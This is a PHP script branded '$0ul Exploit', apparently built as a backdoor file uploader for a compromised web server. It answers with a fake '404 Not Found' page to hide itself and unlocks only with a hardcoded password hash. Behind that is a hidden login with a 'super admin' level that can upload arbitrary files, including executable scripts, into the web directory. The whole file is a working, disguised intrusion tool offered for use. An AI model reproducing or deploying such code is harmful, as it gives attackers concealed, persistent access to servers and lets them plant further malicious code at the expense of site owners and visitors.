<?php
http_response_code(404);
ob_start();
session_start();
//coder : $0ul 
//date  : 27/2/2022
//script name : 404 file uploader
//script type : file upload script
//version : 1.0
?>
<?
if(isset($_POST["logout"])){
unset($_SESSION["success"]);
unset($_SESSION["login"]);
unset($_SESSION["super_admin"]);
}
?>
<?php
//Edit your file name here 
$script_name = "404.php";
//password check
if(isset($_REQUEST["pwd"])){
$pw = md5($_REQUEST["pwd"]);
if($pw == "4662d3d62ec9e5ddd91589074e4f631b"){
$_SESSION["success"] = true;
}
}
if(isset($_SESSION["success"])){
$session = $_SESSION["success"];
//login page
if($session == true){
echo '<!DOCTYPE html>';
echo '<html>';
echo '<head>';
echo '<title>$0ul Exploit</title>';
echo '<meta charset="utf-8">';
echo '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">';
echo '<link rel="shortcut icon" href="https://i.top4top.io/p_2250bq7ja0.png" sizes="196x196"/>';
echo '<style>';
echo '/*
body{
  background-image:url("");
}*/';
echo '#main_heading{
  text-align:center;
  color:#ff0000;
}';
echo '.logo{
   width:50%;
   height:50%;
   display:block;
   margin-left:auto;
   margin-right:auto;
   border:1px solid #fff;
   border-radius:10px;
}';
echo '.login{
  margin-top:10px;
}';
echo '.password{
   width:250px;
   display:block;
   margin-left:auto;
   margin-right:auto;
   padding:5px;
   border:1px solid #000;
   border-radius:5px;
}';
echo '.login_btn{
  width:100px;
  display:block;
  margin-top:10px;
  margin-left:auto;
  margin-right:auto;
  padding:10px;
  border:1px solid #000;
  border-radius:10px;
}';
echo '.success_status{
  text-align:center;
  color:#00ff00;
}';
echo '.error_status{
  text-align:center;
  color:#ff0000;
}';
echo '.upload_field{
  display:block;
  margin-left:auto;
  margin-right:auto;
  border:1px solid #000;
  border-radius:10px;
  color:#000;
  padding:10px;
}';
echo '.upload_btn{
  width:100px;
  padding:5px;
  display:block;
  margin-top:10px;
  margin-left:auto;
  margin-right:auto;
  border:2px solid #000;
  border-radius:5px;
  color:#000;
}';
echo '#pw_error{
  text-align:center;
  color:red;
}';
echo '.form{
  margin-top:10px;
  display:block;
}';
echo '.logout{
  width:100px;
  padding:5px;
  display:block;
  margin-top:10px;
  margin-left:auto;
  margin-right:auto;
  border:2px solid #000;
  border-radius:5px;
  color:#000;
}';
echo '</style>';
echo '</head>';
echo '<body>';
echo '<div class="container">';
echo '<h2 id="main_heading">$0ul Exploit</h2>';
echo '<img class="logo" src="https://f.top4top.io/p_2191q2zkn0.gif"/>';
echo '</div>';
echo '<div class="login">';
echo "<form action='$script_name' method='POST'>";
echo '<input class="password" type="password" name="password" placeholder="Password"/>';
echo '<input class="login_btn" type="submit" name="login" value="Login"/>';
echo '</form>';
if(isset($_POST["login"])){
$password = $_POST["password"];
$hash_pass = md5($password);
//user pass
if($hash_pass == "4662d3d62ec9e5ddd91589074e4f631b"){
$_SESSION["login"] = true;
$_SESSION["super_admin"] = false;
}
//super admin pass
elseif($hash_pass == "831c323a386a83f5f2a62ae9e7da45d9"){
$_SESSION["login"] = true;
$_SESSION["super_admin"] = true;
}
else{
  echo "<p id='pw_error'>Failed to Login</p>";
}
}
echo '</div>';
//coded by $0ul
if(isset($_POST["upload"])){
$file_name = basename($_FILES["file"]["name"]);
if($_SESSION["super_admin"] == true){
if(move_uploaded_file($_FILES["file"]["tmp_name"],$file_name)){
echo "<p class='success_status'> Successfully uploaded </p>";
}else{
echo "<p class='error_status'> An error occured! </p>";
}}  
else{
$file_type = pathinfo($_FILES["file"]["name"],PATHINFO_EXTENSION);
if($file_type != "html" && $file_type != "txt"){
echo "<p class='error_status'> Upload Failed! </p>";
}else{
if(move_uploaded_file($_FILES["file"]["tmp_name"],$file_name)){
echo "<p class='success_status'> Successfully uploaded </p>";
}else{
echo "<p class='error_status'> An error occuored! </p>";
}}}}
if(isset($_SESSION["login"])){
echo '<div class="form">';
echo "<form action='$script_name' method='POST' enctype='multipart/form-data'>";
echo '<input class="upload_field" type="file" name="file"/>';
echo '<input class="upload_btn" type="submit" name="upload" value="Upload"/>';
echo '</form>';
echo "<form action='$script_name' method='POST'>";
echo '<input type="hidden" name="logout" value="true"/>';
echo '<input class="logout" type="submit" name="logout_btn" value="Logout"/>';
echo '</form>';
echo '</div>';
echo "<script>";
echo "var login = document.querySelector('.login');";
echo "var form = document.querySelector('.form');";
echo "login.style.display = 'none';";
echo "form.style.display = 'block';";
echo "</script>";
}
echo '</body>';
echo '</html>';
}else{
//http error page
echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">';
echo '<title>404 Not Found</title>';
echo '<h1>Not Found</h1>';
echo '<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>';
}
}else{
//http error page
echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">';
echo '<title>404 Not Found</title>';
echo '<h1>Not Found</h1>';
echo '<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>';
}
?>
